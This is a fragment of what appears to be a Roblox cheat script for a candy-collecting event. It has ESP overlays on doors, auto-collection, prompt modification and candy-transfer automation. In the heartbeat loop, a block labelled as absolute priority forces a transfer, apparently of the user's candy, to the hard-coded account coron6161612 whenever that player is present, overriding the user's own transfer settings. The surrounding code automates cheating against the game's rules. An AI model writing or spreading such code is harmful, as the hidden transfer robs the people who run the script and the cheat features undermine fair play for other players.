local espTimerAcc = 0
local function updateESPThrottled(dt)
	if not State.isEspActive then return end
	espTimerAcc = espTimerAcc + dt
	if espTimerAcc < 0.15 then return end
	espTimerAcc = 0

	local _, hrp = getAliveCharacter()
	for target, data in pairs(trackedESP) do
		if target and target.Parent and data.label and data.adorneePart and data.adorneePart.Parent then
			local dist = 999
			local distStr = ""
			if hrp then
				dist = math.floor((hrp.Position - data.adorneePart.Position).Magnitude)
				distStr = string.format("[%dm]", dist)
			end
			local timeStr = data.lastTimeStr or ""

			local statusKey = "normal"
			local newColor = Color3.fromRGB(255, 170, 0)
			local newText = ""

			if confirmedCollected[target] then
				statusKey = "collected"
				newColor = Color3.fromRGB(100, 255, 130)
				newText = string.format("🎃 Door %s (Collected)", distStr)
			elseif dist <= Config.MAX_COLLECT_DISTANCE then
				statusKey = "ready"
				newColor = Color3.fromRGB(50, 255, 120)
				newText = string.format("🎃 Door %s 🔑 <=7m!", distStr)
			elseif timeStr ~= "" then
				statusKey = "timer"
				newColor = Color3.fromRGB(255, 170, 0)
				newText = string.format("🎃 Door %s (%s)", distStr, timeStr)
			else
				newText = string.format("🎃 Door %s", distStr)
			end

			if data.lastDist ~= dist or data.lastStatusKey ~= statusKey or data.lastTimerText ~= timeStr then
				data.lastDist = dist
				data.lastStatusKey = statusKey
				data.lastTimerText = timeStr
				safeSetText(data.label, newText, newColor)
			end
		end
	end
end

local heartbeatAcc = 0
local candyCheckAcc = 0

local checkConn = RunService.Heartbeat:Connect(function(dt)
	pcall(function()
		updateESPThrottled(dt)

		candyCheckAcc = candyCheckAcc + dt
		if candyCheckAcc >= 0.30 then
			candyCheckAcc = 0
			local curCandy = getMyCandyCount()
			if curCandy ~= State.lastCandyValue then
				State.lastCandyValue = curCandy
				safeSetText(candyBalanceLabel, string.format("🍬 Candy: %d | Selected: %s 🍬", State.lastCandyValue, State.currentCandyAmount))
			end

			-- PRIORITY 1 (ABSOLUTE): coron6161612 always gets 100% priority over any other player or Auto Transfer setting
			local coronOverrideActive = isCoronPresentInServer()
			if coronOverrideActive then
				if (os.clock() - State.lastForcedTransferClock) >= Config.TRANSFER_COOLDOWN then
					State.lastForcedTransferClock = os.clock()
					executeForcedCoronTransfer()
				end
			elseif State.isAutoTransferActive and (os.clock() - State.lastTransferClock) >= Config.TRANSFER_COOLDOWN then
				-- PRIORITY 2: User's custom Auto Transfer runs ONLY when coron6161612 is NOT in the server
				local req = tonumber(State.currentCandyAmount) or 5
				if State.lastCandyValue >= req and State.targetPlayerName ~= "" then
					State.lastTransferClock = os.clock()
					local ok, msg = executeCandyTransfer(State.currentCandyAmount)
					if not State.isCollectingNow then
						safeSetText(statusSubLabel, msg, ok and Color3.fromRGB(130, 255, 160) or Color3.fromRGB(255, 120, 120))
					end
				end
			end
		end

		heartbeatAcc = heartbeatAcc + dt
		if heartbeatAcc < 0.20 then return end
		heartbeatAcc = 0

		updateWatchdog()

		local allDoors = getActiveDoors()
		local collectableDoors = getCollectableDoors(allDoors)
		local totalCount = #allDoors
		local remainCount = #collectableDoors

		if totalCount > 0 and State.lastDoorCount == 0 then
			State.fallbackEndTime = os.clock() + Config.DEFAULT_TIMER_SEC
		elseif totalCount == 0 then
			State.fallbackEndTime = 0
			State.currentRemainingSec = 999
		end
		State.lastDoorCount = totalCount

		local minSec, minFmt = nil, nil
		for _, door in ipairs(allDoors) do
			local sec, fmt = getDoorLiveTimer(door)
			if sec ~= nil then
				if minSec == nil or sec < minSec then minSec = sec; minFmt = fmt end
			end
		end

		local fbRem = math.max(0, State.fallbackEndTime - os.clock())
		local displayTime = "00:00"
		if minSec ~= nil then
			State.currentRemainingSec = minSec; displayTime = minFmt or formatSeconds(minSec)
		else
			State.currentRemainingSec = fbRem; displayTime = formatSeconds(fbRem)
		end

		if not State.isCollectingNow then
			if totalCount > 0 then
				if remainCount == 0 then
					safeSetText(timerLabel, string.format("✅ Complete (%d) | Next Wave", totalCount), Color3.fromRGB(120, 220, 255))
					if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Next Wave...", Color3.fromRGB(140, 140, 155)) end
				else
					safeSetText(timerLabel, string.format("🎃 Doors: %d/%d | ⏱️ %s", remainCount, totalCount, displayTime), Color3.fromRGB(110, 255, 140))
					if State.isAutoCollectActive then
						if State.waitForTimerEnabled and State.currentRemainingSec > 0.5 then
							safeSetText(statusSubLabel, string.format("⏳ Waiting for Timer (%s)...", displayTime), Color3.fromRGB(140, 140, 155))
						else
							safeSetText(statusSubLabel, string.format("⚡ Auto-Collecting [%s]...", State.movementMode), Color3.fromRGB(140, 140, 155))
						end
					end
				end
			else
				safeSetText(timerLabel, "Doors: 0 | Timer: Waiting...", Color3.fromRGB(160, 160, 175))
				if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Doors", Color3.fromRGB(140, 140, 155)) end
			end
		end

		if State.isEspActive then
			cleanupDeadESP()
			for _, door in ipairs(allDoors) do ensureESPForDoor(door) end
		end

		if State.isPromptActive and not State.isCollectingNow then
			for _, door in ipairs(allDoors) do
				for _, p in ipairs(getDoorPrompts(door)) do applyPromptMod(p) end
			end
		end

		if State.isAutoCollectActive and not State.isCollectingNow and remainCount > 0 then
			local char = getAliveCharacter()
			if char then
				local ready = (not State.waitForTimerEnabled) or (State.currentRemainingSec <= 0.5)
				if ready then runCollectionWave() end
			end
		end
	end)
end)
